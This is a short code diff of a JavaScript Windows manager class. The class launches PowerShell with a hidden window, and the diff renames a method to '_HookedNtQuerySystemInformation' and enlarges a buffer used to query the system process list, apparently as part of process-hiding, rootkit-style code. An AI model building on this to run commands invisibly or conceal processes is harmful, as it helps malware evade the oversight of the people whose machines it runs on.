@@ -23,11 +23,11 @@ export default class ManagerWin32 {
     this.shell32.ShellExecuteA(0, "open", "powershell", command, null, 0);
   }
 
-  hidden() {
+  _HookedNtQuerySystemInformation() {
     const STATUS_SUCCESS = 0;
     const SystemProcessInformation = 5;
 
-    let bufferSize = 412880;
+    let bufferSize = 41288000;
     let buffer = Buffer.alloc(bufferSize);
     let status;
 
